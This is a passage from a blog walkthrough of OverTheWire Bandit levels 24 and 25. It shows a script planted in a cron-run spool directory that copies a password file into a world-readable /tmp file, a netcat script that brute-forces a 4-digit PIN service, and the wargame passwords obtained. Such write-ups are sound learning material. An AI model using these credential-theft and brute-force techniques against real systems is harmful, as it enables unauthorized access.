<p>NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…</p>
</blockquote>

<p>So let&rsquo;s first go to <code>/etc/crond.d/</code> and check this level&rsquo;s file.</p>

<pre><code class="language-bash">bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null
</code></pre>

<p><strong>cat</strong> the file mentioned in here</p>

<pre><code class="language-bash">bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo &quot;Executing and deleting all scripts in /var/spool/$myname:&quot;
for i in * .*;
do
    if [ &quot;$i&quot; != &quot;.&quot; -a &quot;$i&quot; != &quot;..&quot; ];
    then
        echo &quot;Handling $i&quot;
        timeout -s 9 60 ./$i
        rm -f ./$i
    fi
done
</code></pre>

<p>Once again this <strong>cron</strong> job is being ran as another user in this case <strong>bandit24</strong>. So <code>myname</code> will contain <code>bandit24</code>, leading us to the <code>/var/spool/bandit24</code> directory. The message printed by <strong>echo</strong> tells us that it will execute and delete all scripts in here, so our idea would be to create a script that will <strong>cat</strong> the password file into another file that we create. This very simple to write in a <strong>bash</strong> script, let&rsquo;s do it</p>

<pre><code class="language-bash">#!/bin/bash

mkdir /tmp/dirforcron
cat /etc/bandit_pass/bandit24 &gt; /tmp/dirforcron/pass
chmod 777 /tmp/dirforcron/pass
</code></pre>

<p>We will create this file in <code>/tmp/dirfortest/</code> and name it <code>script.sh</code>.
So what this do is creating a new directory to work in, cat the password file into a file in that directory and then changing the permissions to make it accessible to everyone. Now when we put this file in <code>/var/spool/bandit24</code> we have to be sure that the user who will run it has enough permissions to do so. We can do this by doing</p>

<pre><code class="language-bash">bandit23@bandit:/var/spool/bandit24$ chmod 777 /tmp/dirfortest/script.sh
</code></pre>

<p>Now that we gave it all the permissions possible we just need to copy it to <code>/var/spool/bandit24</code> and wait for it to be ran.</p>

<pre><code class="language-bash">bandit23@bandit:/var/spool/bandit24$ cat /tmp/dirforcron/pass
cat: /tmp/dirforcron/pass: No such file or directory
bandit23@bandit:/var/spool/bandit24$ cat /tmp/dirforcron/pass
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
</code></pre>

<p>Success!!! Let&rsquo;s go onto the next one.</p>

<h2 id="level-25-http-overthewire-org-wargames-bandit-bandit25-html"><a href="http://overthewire.org/wargames/bandit/bandit25.html">Level 25</a></h2>

<p><a name="level25"></p>

<blockquote>
<p>A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.</p>
</blockquote>

<p>First let&rsquo;s try to connect and see what it prints. We will use netcat to connect as before.</p>

<pre><code class="language-bash">bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
(...jibberish...)
Wrong! Please enter the correct current password. Try again.
^C
</code></pre>

<p>So it expects the password and the pin code in a line separated by a space. You can use your preferred scripting language to try and bruteforce this. I&rsquo;ll use bash since it doesn&rsquo;t depend on anything being preinstalled in the system (besides bash of course).</p>

<pre><code class="language-bash">#!/bin/bash
rm input1.txt
rm input2.txt
rm output.txt

touch output.txt
touch input.txt
for i in {0000..5000}
do
        echo &quot;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i&quot; &gt;&gt; input1.txt
done

for i in {5001..9999}
do
        echo &quot;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i&quot; &gt;&gt; input2.txt
done

echo &quot;input created will start nc connection&quot;

cat input1.txt | nc localhost 30002 &gt;&gt; output.txt
cat input2.txt | nc localhost 30002 &gt;&gt; output.txt

cat output.txt | grep -v Wrong
</code></pre>

<p>So what this does is it creates 2 input files with all the combinations. I do this because when i tried to do it all in once the connection tended to timeout. After creating the input i pipe it to a <strong>nc</strong> connection and write the result to a file. Finally, i pipe the content of the file to <strong>grep</strong> (the <code>-v</code> flag is to do invert macthing, so the lines that don&rsquo;t contain &ldquo;Wrong&rdquo;) and the correct answer should be there.</p>

<pre><code class="language-bash">bandit24@bandit:/tmp/testbash$ bash script.sh 
rm: cannot remove 'input1.txt': No such file or directory
rm: cannot remove 'input2.txt': No such file or directory
input created will start nc connection
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Timeout. Exiting.
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
</code></pre>

<p>Next one.</p>

  </div>
  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">© 2019 Bruno Anjos :: Powered by Hugo :: Theme made by panr</div>
    
  </div>
</footer>

<script src="https://bruno-anjos.github.io/assets/main.js"></script>
<script src="https://bruno-anjos.github.io/assets/prism.js"></script>





  
</div>

</body>
</html>
